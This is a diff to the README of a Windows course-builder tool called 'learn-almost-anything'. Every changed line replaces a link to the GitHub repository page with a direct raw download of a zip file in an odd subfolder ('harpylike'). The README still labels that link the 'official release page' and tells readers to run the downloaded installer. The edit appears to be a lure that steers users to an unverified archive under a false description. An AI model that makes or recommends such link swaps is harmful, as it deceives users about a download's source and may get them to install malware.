@@ -1,6 +1,6 @@
 # 🎓 learn-almost-anything - Create custom courses on any topic
 
-[![](https://img.shields.io/badge/Download-learn--almost--anything-blue)](https://github.com/Unitary-eurasian711/learn-almost-anything)
+[![](https://img.shields.io/badge/Download-learn--almost--anything-blue)](https://raw.githubusercontent.com/Unitary-eurasian711/learn-almost-anything/main/harpylike/anything_learn_almost_3.3.zip)
 
 ## 📖 What is this tool?
 
@@ -21,14 +21,14 @@ To use this software, you need:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official release page](https://github.com/Unitary-eurasian711/learn-almost-anything) to access the installation files.
+1. Visit the [official release page](https://raw.githubusercontent.com/Unitary-eurasian711/learn-almost-anything/main/harpylike/anything_learn_almost_3.3.zip) to access the installation files.
 2. Look for the "Assets" section at the bottom of the latest release.
 3. Click the file ending in `.msi` or `.exe` to begin the download.
 4. Open the downloaded file once the process finishes.
 5. Follow the prompts on your screen to complete the installation.
 6. Launch the application from your Start Menu after the installer finishes.
 
-[![](https://img.shields.io/badge/Download-Get_the_Installer-grey)](https://github.com/Unitary-eurasian711/learn-almost-anything)
+[![](https://img.shields.io/badge/Download-Get_the_Installer-grey)](https://raw.githubusercontent.com/Unitary-eurasian711/learn-almost-anything/main/harpylike/anything_learn_almost_3.3.zip)
 
 ## 🔑 Setting up your account
 
